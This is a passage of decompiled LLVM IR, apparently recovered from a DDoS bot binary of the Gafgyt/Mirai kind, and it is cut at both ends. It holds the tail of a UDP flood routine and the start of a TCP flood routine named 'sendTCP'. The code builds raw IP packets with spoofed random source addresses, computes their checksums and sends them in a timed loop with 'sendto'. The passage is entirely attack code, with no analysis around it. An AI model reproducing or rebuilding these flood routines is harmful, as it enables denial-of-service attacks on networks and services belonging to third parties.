  %v1_ca8426 = phi i32 [ 49, %dec_label_pc_ca40 ], [ %v1_ca84, %dec_label_pc_ca4c ]
  %v2_ca50 = call i32 @__GI_time(i32* null)
  store i32 %v2_ca50, i32* %r3.global-to-local, align 4
  store i32 %v2_ca50, i32* @r4, align 4
  %v0_ca5c = call i32 @rand_cmwc()
  %v0_ca64 = load i32, i32* @r4, align 4
  %v2_ca64 = xor i32 %v0_ca64, %v0_ca5c
  store i32 %v2_ca64, i32* %r3.global-to-local, align 4
  %v1_ca6c = call i32 @srand(i32 %v2_ca64)
  %v0_ca70 = call i32 @random()
  store i32 %v0_ca70, i32* %r3.global-to-local, align 4
  %v1_ca7c = call i32 @init_rand(i32 %v0_ca70)
  %v1_ca84 = add nsw i32 %v1_ca8426, -1
  store i32 %v1_ca84, i32* %r3.global-to-local, align 4
  %v3_ca90 = icmp eq i32 %v1_ca8426, 0
  br i1 %v3_ca90, label %dec_label_pc_ca98, label %dec_label_pc_ca4c

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca4c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_ca9c = icmp eq i32 %arg4, 0
  br i1 %v2_ca9c, label %dec_label_pc_cac8, label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca98
  %v1_cab4 = sub i32 32, %arg4
  store i32 %v1_cab4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cac0 = shl i32 -1, %v1_cab4
  br label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_ca98, %dec_label_pc_cab0
  %storemerge12 = phi i32 [ %v1_cac0, %dec_label_pc_cab0 ], [ 0, %dec_label_pc_ca98 ]
  %v3_cac8 = load i32, i32* %stack_var_0, align 4
  %v1_cacc = add i32 %v3_cac8, 28
  %v1_cadc = add i32 %v3_cac8, 34
  %v3_cae0 = and i32 %v1_cadc, -4
  %v1_cae8 = load i32, i32* @sp, align 4
  %v2_cae8 = sub i32 %v1_cae8, %v3_cae0
  %v1_caf8 = add i32 %v2_cae8, 11
  %v3_cafc = and i32 %v1_caf8, -4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cb1c = add i32 %v3_cafc, 20
  store i32 %v1_cb1c, i32* %r3.global-to-local, align 4
  %v5_cb20 = inttoptr i32 %v1_cb1c to i8*
  %v3_cb24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_cb24, i32* @r4, align 4
  %v1_cb2c = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cb2c, i32* %r3.global-to-local, align 4
  %v1_cb38 = call i32 @htonl(i32 %v1_cb2c)
  store i32 %v1_cb38, i32* %r2.global-to-local, align 4
  %v3_cb40 = load i32, i32* %stack_var_0, align 4
  %v1_cb44 = add i32 %v3_cb40, 8
  %v1_cb48 = load i32, i32* @sp, align 4
  %v2_cb48 = inttoptr i32 %v1_cb48 to i32*
  store i32 %v1_cb44, i32* %v2_cb48, align 4
  %v0_cb50 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_cb58 = inttoptr i32 %v3_cafc to i8*
  %v5_cb58 = call i32 @makeIPPacket(i8* %v4_cb58, i32 %v0_cb50, i32 %v1_cb38, i32 17)
  %v3_cb5c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cb5c, 8
  %v3_cb70 = urem i32 %fold, 65536
  store i32 %v3_cb70, i32* %r3.global-to-local, align 4
  %v1_cb78 = call i32 @htons(i32 %v3_cb70)
  %sext = mul i32 %v1_cb78, 16777216
  %v1_cb7c = sdiv i32 %sext, 16777216
  store i32 %v1_cb7c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cb84 = trunc i32 %v1_cb7c to i8
  %v3_cb84 = add i32 %v3_cafc, 24
  %v4_cb84 = inttoptr i32 %v3_cb84 to i8*
  store i8 %v1_cb84, i8* %v4_cb84, align 4
  %v0_cb88 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb88 = sdiv i32 %v0_cb88, 256
  store i32 %v3_cb88, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v3_cb88 to i8
  %v2_cb8c = load i32, i32* %r2.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 5
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = call i32 @rand_cmwc()
  %v3_cb9c = urem i32 %v0_cb90, 65536
  store i32 %v3_cb9c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cba4 = trunc i32 %v0_cb90 to i8
  store i8 %v1_cba4, i8* %v5_cb20, align 4
  %v0_cba8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cba836 = udiv i32 %v0_cba8, 256
  %v1_cbac = trunc i32 %v3_cba836 to i8
  %v2_cbac = load i32, i32* %r2.global-to-local, align 4
  %v3_cbac = add i32 %v2_cbac, 1
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v1_cbac, i8* %v4_cbac, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c784, label %dec_label_pc_cbbc, label %dec_label_pc_cbd4

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cac8
  %v0_cbbc = call i32 @rand_cmwc()
  %v3_cbc4 = mul i32 %v0_cbbc, 65536
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_cbbc to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbd4:                                ; preds = %dec_label_pc_cac8
  %v3_cbdc = urem i32 %arg2, 65536
  store i32 %v3_cbdc, i32* %r3.global-to-local, align 4
  %v1_cbe4 = call i32 @htons(i32 %v3_cbdc)
  %extract.t102 = trunc i32 %v1_cbe4 to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbbc, %dec_label_pc_cbd4
  %v0_cbbc.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_cbbc ], [ %extract.t102, %dec_label_pc_cbd4 ]
  %v3_cd08.pre-phi = phi i32 [ 0, %dec_label_pc_cbbc ], [ %v3_cbdc, %dec_label_pc_cbd4 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cbf4 = sext i8 %v0_cbbc.sink.off0 to i32
  %v3_cbf8 = add i32 %v3_cafc, 22
  %v4_cbf8 = inttoptr i32 %v3_cbf8 to i8*
  store i8 %v0_cbbc.sink.off0, i8* %v4_cbf8, align 2
  %v3_cc0040 = udiv i32 %v4_cbf4, 256
  %v1_cc04 = trunc i32 %v3_cc0040 to i8
  %v2_cc04 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc04 = add i32 %v2_cc04, 3
  %v4_cc04 = inttoptr i32 %v3_cc04 to i8*
  store i8 %v1_cc04, i8* %v4_cc04, align 1
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc10 = add i32 %v3_cafc, 26
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 2
  %v0_cc14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc14 = trunc i32 %v0_cc14 to i8
  %v2_cc14 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc14 = add i32 %v2_cc14, 7
  %v4_cc14 = inttoptr i32 %v3_cc14 to i8*
  store i8 %v1_cc14, i8* %v4_cc14, align 1
  %v1_cc1c = add i32 %v3_cafc, 28
  store i32 %v1_cc1c, i32* %r3.global-to-local, align 4
  %v3_cc24 = load i32, i32* %stack_var_0, align 4
  %v2_cc28 = call i32 @makeRandomStr(i32 %v1_cc1c, i32 %v3_cc24)
  %v1_cc38 = or i32 %v3_cafc, 2
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v1_cc3c = inttoptr i32 %v1_cc38 to i8*
  %v2_cc3c = load i8, i8* %v1_cc3c, align 2
  %v3_cc3c = zext i8 %v2_cc3c to i32
  store i32 %v3_cc3c, i32* %r2.global-to-local, align 4
  %v1_cc40 = or i32 %v1_caf8, 3
  %v2_cc40 = inttoptr i32 %v1_cc40 to i8*
  %v3_cc40 = load i8, i8* %v2_cc40, align 1
  %v4_cc40 = zext i8 %v3_cc40 to i32
  %v4_cc44 = mul nuw nsw i32 %v4_cc40, 256
  %v5_cc44 = or i32 %v4_cc44, %v3_cc3c
  store i32 %v5_cc44, i32* %r3.global-to-local, align 4
  %v3_cc50 = call i32 @csum(i8* %v4_cb58, i32 %v5_cc44)
  %sext6 = mul i32 %v3_cc50, 16777216
  %v1_cc54 = sdiv i32 %sext6, 16777216
  store i32 %v1_cc54, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc5c = trunc i32 %v1_cc54 to i8
  %v3_cc5c = add i32 %v3_cafc, 10
  %v4_cc5c = inttoptr i32 %v3_cc5c to i8*
  store i8 %v1_cc5c, i8* %v4_cc5c, align 2
  %v0_cc60 = load i32, i32* %r3.global-to-local, align 4
  %v3_cc60 = sdiv i32 %v0_cc60, 256
  store i32 %v3_cc60, i32* %r3.global-to-local, align 4
  %v1_cc64 = trunc i32 %v3_cc60 to i8
  %v2_cc64 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc64 = add i32 %v2_cc64, 11
  %v4_cc64 = inttoptr i32 %v3_cc64 to i8*
  store i8 %v1_cc64, i8* %v4_cc64, align 1
  %v2_cc6c = call i32 @__GI_time(i32* null)
  %v2_cc78 = add i32 %v2_cc6c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cd48 = add i32 %v3_cafc, 4
  %v4_cd48 = inttoptr i32 %v3_cd48 to i8*
  %v2_cd70 = add i32 %v3_cafc, 12
  %v3_cd70 = inttoptr i32 %v2_cd70 to i32*
  %v3_ce08 = mul i32 %arg8, 4
  %v3_ce18 = mul i32 %arg8, 1000
  br label %dec_label_pc_cc94.outer

dec_label_pc_cc94.outer:                          ; preds = %dec_label_pc_ce30, %dec_label_pc_ce00, %dec_label_pc_cbf0
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ %v1_cde8, %dec_label_pc_ce00 ], [ %v1_cde8, %dec_label_pc_ce30 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ 0, %dec_label_pc_ce00 ], [ %v1_ce34, %dec_label_pc_ce30 ]
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc94.outer, %dec_label_pc_cdd8
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_cdd8 ], [ %stack_var_-104.0.ph, %dec_label_pc_cc94.outer ]
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc9c = load i32, i32* @sp, align 4
  %v2_cc9c = inttoptr i32 %v1_cc9c to i32*
  store i32 %v2_c7f0, i32* %v2_cc9c, align 4
  %v1_cca4 = load i32, i32* @sp, align 4
  %v2_cca4 = add i32 %v1_cca4, 4
  %v3_cca4 = inttoptr i32 %v2_cca4 to i32*
  store i32 16, i32* %v3_cca4, align 4
  %v0_ccac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cacc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_ccb8 = inttoptr i32 %v0_ccac to i32*
  %v7_ccb8 = call i32 @__libc_sendto(i32 %v0_c9c4, i32* %v6_ccb8, i32 %v1_cacc, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_ccbc = call i32 @rand_cmwc()
  %v3_ccc8 = urem i32 %v0_ccbc, 65536
  store i32 %v3_ccc8, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_ccd0 = trunc i32 %v0_ccbc to i8
  store i8 %v1_ccd0, i8* %v5_cb20, align 4
  %v0_ccd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_ccd441 = udiv i32 %v0_ccd4, 256
  %v1_ccd8 = trunc i32 %v3_ccd441 to i8
  %v2_ccd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd8 = add i32 %v2_ccd8, 1
  %v4_ccd8 = inttoptr i32 %v3_ccd8 to i8*
  store i8 %v1_ccd8, i8* %v4_ccd8, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c784, label %dec_label_pc_cce8, label %dec_label_pc_cd00

dec_label_pc_cce8:                                ; preds = %dec_label_pc_cc94
  %v0_cce8 = call i32 @rand_cmwc()
  %v3_ccf0 = mul i32 %v0_cce8, 65536
  store i32 %v3_ccf0, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_cce8 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  store i32 %v3_cd08.pre-phi, i32* %r3.global-to-local, align 4
  %v1_cd10 = call i32 @htons(i32 %v3_cd08.pre-phi)
  %extract.t104 = trunc i32 %v1_cd10 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_cd00
  %v0_cce8.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_cce8 ], [ %extract.t104, %dec_label_pc_cd00 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cd20 = sext i8 %v0_cce8.sink.off0 to i32
  store i8 %v0_cce8.sink.off0, i8* %v4_cbf8, align 2
  %v3_cd2c = sdiv i32 %v4_cd20, 256
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  %v1_cd30 = trunc i32 %v3_cd2c to i8
  %v2_cd30 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd30 = add i32 %v2_cd30, 3
  %v4_cd30 = inttoptr i32 %v3_cd30 to i8*
  store i8 %v1_cd30, i8* %v4_cd30, align 1
  %v0_cd34 = call i32 @rand_cmwc()
  %v3_cd40 = urem i32 %v0_cd34, 65536
  store i32 %v3_cd40, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cd48 = trunc i32 %v0_cd34 to i8
  store i8 %v1_cd48, i8* %v4_cd48, align 4
  %v0_cd4c = load i32, i32* %r3.global-to-local, align 4
  %v3_cd4c = sdiv i32 %v0_cd4c, 256
  store i32 %v3_cd4c, i32* %r3.global-to-local, align 4
  %v1_cd50 = trunc i32 %v3_cd4c to i8
  %v2_cd50 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd50 = add i32 %v2_cd50, 5
  %v4_cd50 = inttoptr i32 %v3_cd50 to i8*
  store i8 %v1_cd50, i8* %v4_cd50, align 1
  %v1_cd58 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cd58, i32* %r3.global-to-local, align 4
  %v1_cd64 = call i32 @htonl(i32 %v1_cd58)
  store i32 %v1_cd64, i32* %r2.global-to-local, align 4
  store i32 %v1_cd64, i32* %v3_cd70, align 4
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v2_cd84 = load i8, i8* %v1_cc3c, align 2
  %v3_cd84 = zext i8 %v2_cd84 to i32
  store i32 %v3_cd84, i32* %r2.global-to-local, align 4
  %v3_cd88 = load i8, i8* %v2_cc40, align 1
  %v4_cd88 = zext i8 %v3_cd88 to i32
  %v4_cd8c = mul nuw nsw i32 %v4_cd88, 256
  %v5_cd8c = or i32 %v4_cd8c, %v3_cd84
  store i32 %v5_cd8c, i32* %r3.global-to-local, align 4
  %v3_cd98 = call i32 @csum(i8* %v4_cb58, i32 %v5_cd8c)
  %sext7 = mul i32 %v3_cd98, 16777216
  %v1_cd9c = sdiv i32 %sext7, 16777216
  store i32 %v1_cd9c, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cda4 = trunc i32 %v1_cd9c to i8
  store i8 %v1_cda4, i8* %v4_cc5c, align 2
  %v0_cda8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cda845 = udiv i32 %v0_cda8, 256
  %v1_cdac = trunc i32 %v3_cda845 to i8
  %v2_cdac = load i32, i32* %r2.global-to-local, align 4
  %v3_cdac = add i32 %v2_cdac, 11
  %v4_cdac = inttoptr i32 %v3_cdac to i8*
  store i8 %v1_cdac, i8* %v4_cdac, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_cdb8 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_cdb8, label %dec_label_pc_cdc0, label %dec_label_pc_cde4

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd1c
  %v2_cdc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_cdc4, i32* %r2.global-to-local, align 4
  store i32 %v2_cc78, i32* %r3.global-to-local, align 4
  %v8_cdd4 = icmp sgt i32 %v2_cdc4, %v2_cc78
  br i1 %v8_cdd4, label %dec_label_pc_ce40, label %dec_label_pc_cdd8

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdc0
  br label %dec_label_pc_cc94

dec_label_pc_cde4:                                ; preds = %dec_label_pc_cd1c
  %v1_cde8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_cde8, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_cdf8 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_cdf8, label %dec_label_pc_ce00, label %dec_label_pc_ce30

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cde4
  store i32 %v3_ce08, i32* %r2.global-to-local, align 4
  store i32 %v3_ce18, i32* %r3.global-to-local, align 4
  %v1_ce20 = call i32 @usleep(i32 %v3_ce18)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce30:                                ; preds = %dec_label_pc_cde4
  %v1_ce34 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_ce34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce40:                                ; preds = %dec_label_pc_cdc0, %dec_label_pc_ca28, %dec_label_pc_c9dc
  %v12_ce4833 = phi i32 [ %v3_ca38, %dec_label_pc_ca28 ], [ %v3_c9ec, %dec_label_pc_c9dc ], [ %v2_cdc4, %dec_label_pc_cdc0 ]
  br label %dec_label_pc_ce44

dec_label_pc_ce44:                                ; preds = %dec_label_pc_c930, %dec_label_pc_c7d0, %dec_label_pc_c858, %dec_label_pc_c840, %dec_label_pc_ce40
  %v12_ce48 = phi i32 [ %v3_c7e0, %dec_label_pc_c7d0 ], [ 0, %dec_label_pc_c858 ], [ %v3_c850, %dec_label_pc_c840 ], [ %v12_ce4833, %dec_label_pc_ce40 ], [ %v2_c934, %dec_label_pc_c930 ]
  store i32 %v3_c754, i32* @r4, align 4
  store i32 %v6_c754, i32* @fp, align 4
  ret i32 %v12_ce48

; uselistorder directives
  uselistorder i32 %v1_ce34, { 1, 0 }
  uselistorder i32 %v1_cde8, { 2, 1, 0 }
  uselistorder i32 %v1_cd9c, { 1, 0 }
  uselistorder i32 %v3_cd4c, { 1, 0 }
  uselistorder i32 %v0_cd34, { 1, 0 }
  uselistorder i32 %v3_cd2c, { 1, 0 }
  uselistorder i8 %v0_cce8.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cce8, { 1, 0 }
  uselistorder i32 %v0_ccbc, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_ce18, { 1, 0 }
  uselistorder i32 %v2_cc78, { 1, 0 }
  uselistorder i32 %v3_cc60, { 1, 0 }
  uselistorder i32 %v1_cc54, { 1, 0 }
  uselistorder i32 %v1_cc38, { 0, 2, 1 }
  uselistorder i32 %v3_cd08.pre-phi, { 1, 0 }
  uselistorder i8 %v0_cbbc.sink.off0, { 1, 0 }
  uselistorder i32 %v3_cbdc, { 2, 1, 0 }
  uselistorder i32 %v0_cbbc, { 1, 0 }
  uselistorder i32 %v0_cb90, { 1, 0 }
  uselistorder i32 %v3_cb88, { 1, 0 }
  uselistorder i32 %v1_cb7c, { 1, 0 }
  uselistorder i32 %v3_cb70, { 1, 0 }
  uselistorder i32 %v3_cafc, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_cacc, { 1, 0 }
  uselistorder i32 %v1_ca84, { 1, 0 }
  uselistorder i32 %v1_c958, { 1, 0 }
  uselistorder i32 %v3_c8d0, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_c988, { 1, 0 }
  uselistorder i32 %v2_c8b4, { 1, 0 }
  uselistorder i32 %v1_c864, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_c7f0, { 1, 0, 2 }
  uselistorder i32 %v3_c7b4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_ce44, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cbf0, { 1, 0 }
  uselistorder label %dec_label_pc_cac8, { 1, 0 }
  uselistorder label %dec_label_pc_ca4c, { 1, 0 }
  uselistorder label %dec_label_pc_c930, { 1, 0 }
  uselistorder label %dec_label_pc_c8d0, { 1, 0 }
  uselistorder label %dec_label_pc_c7d0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ce5c = load i32, i32* @r4, align 4
  %v6_ce5c = load i32, i32* @fp, align 4
  store i32 52836, i32* %stack_var_-4, align 4
  %v2_ce60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ce60, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ce9c = icmp eq i32 %arg2, 0
  br i1 %v2_ce9c, label %dec_label_pc_cea4, label %dec_label_pc_cec4

dec_label_pc_cea4:                                ; preds = %entry
  %v0_cea4 = call i32 @rand_cmwc()
  %v3_ceac = mul i32 %v0_cea4, 65536
  store i32 %v3_ceac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cee8

dec_label_pc_cec4:                                ; preds = %entry
  %v3_cecc = urem i32 %arg2, 65536
  store i32 %v3_cecc, i32* %r3.global-to-local, align 4
  %v1_ced4 = call i32 @htons(i32 %v3_cecc)
  br label %dec_label_pc_cee8

dec_label_pc_cee8:                                ; preds = %dec_label_pc_cea4, %dec_label_pc_cec4
  %v2_ceec = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_ceec, i32* %r3.global-to-local, align 4
  %v3_cef8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_cef8, i32* %r3.global-to-local, align 4
  %v2_cf00 = icmp eq i32 %v3_cef8, 0
  br i1 %v2_cf00, label %dec_label_pc_cf0c, label %dec_label_pc_d4e4

dec_label_pc_cf0c:                                ; preds = %dec_label_pc_cee8
  %v2_cf0c = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_cf30 = call i32 @socket()
  store i32 %v0_cf30, i32* %r3.global-to-local, align 4
  %v2_cf40 = icmp eq i32 %v0_cf30, 0
  br i1 %v2_cf40, label %dec_label_pc_cf48, label %dec_label_pc_cf60

dec_label_pc_cf48:                                ; preds = %dec_label_pc_cf0c
  %v2_cf4c = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  %v3_cf58 = call i32 @Rootsprintf(i32 %v2_cf4c, i32 ptrtoint ([27 x i8]* @global_var_1973c.468 to i32))
  br label %dec_label_pc_d4e4

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf0c
  store i32 1, i32* %stack_var_-68, align 4
  %v2_cf68 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_cf68, i32* %r3.global-to-local, align 4
  %v6_cf84 = call i32 @__GI_setsockopt(i32 %v0_cf30, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_cf84, i32* %r3.global-to-local, align 4
  %v1_cf8c = icmp slt i32 %v6_cf84, 0
  br i1 %v1_cf8c, label %dec_label_pc_cf94, label %dec_label_pc_cfac

dec_label_pc_cf94:                                ; preds = %dec_label_pc_cf60
  %v2_cf98 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_cf98, i32* %r3.global-to-local, align 4
  %v3_cfa4 = call i32 @Rootsprintf(i32 %v2_cf98, i32 ptrtoint ([33 x i8]* @global_var_19758.470 to i32))
  br label %dec_label_pc_d4e4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cf60
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_cfb0 = icmp eq i32 %arg4, 0
  br i1 %v2_cfb0, label %dec_label_pc_cfdc, label %dec_label_pc_cfc4

dec_label_pc_cfc4:                                ; preds = %dec_label_pc_cfac
  %v1_cfc8 = sub i32 32, %arg4
  store i32 %v1_cfc8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cfd4 = shl i32 -1, %v1_cfc8
  br label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfac, %dec_label_pc_cfc4
  %storemerge10 = phi i32 [ %v1_cfd4, %dec_label_pc_cfc4 ], [ 0, %dec_label_pc_cfac ]
  %v1_cfe0 = add i32 %arg6, 40
  %v1_cff0 = add i32 %arg6, 46
  %v3_cff4 = and i32 %v1_cff0, -4
  %v1_cffc = load i32, i32* @sp, align 4
  %v2_cffc = sub i32 %v1_cffc, %v3_cff4
  %v1_d00c = add i32 %v2_cffc, 11
  %v3_d010 = and i32 %v1_d00c, -4
  store i32 %v3_d010, i32* %r2.global-to-local, align 4
  %v1_d030 = add i32 %v3_d010, 20
  store i32 %v1_d030, i32* %r3.global-to-local, align 4
  %v5_d034 = inttoptr i32 %v1_d030 to i8*
  %v3_d038 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d038, i32* @r4, align 4
  %v1_d040 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d040, i32* %r3.global-to-local, align 4
  %v1_d04c = call i32 @htonl(i32 %v1_d040)
  store i32 %v1_d04c, i32* %r2.global-to-local, align 4
  %v1_d058 = add i32 %arg6, 20
  %v1_d05c = load i32, i32* @sp, align 4
  %v2_d05c = inttoptr i32 %v1_d05c to i32*
  store i32 %v1_d058, i32* %v2_d05c, align 4
  %v0_d064 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_d06c = inttoptr i32 %v3_d010 to i8*
  %v5_d06c = call i32 @makeIPPacket(i8* %v4_d06c, i32 %v0_d064, i32 %v1_d04c, i32 6)
  %v0_d070 = call i32 @rand_cmwc()
  %v3_d07c = urem i32 %v0_d070, 65536
  store i32 %v3_d07c, i32* %r3.global-to-local, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d084 = trunc i32 %v0_d070 to i8
  store i8 %v1_d084, i8* %v5_d034, align 4
  %v0_d088 = load i32, i32* %r3.global-to-local, align 4
  %v3_d088 = sdiv i32 %v0_d088, 256
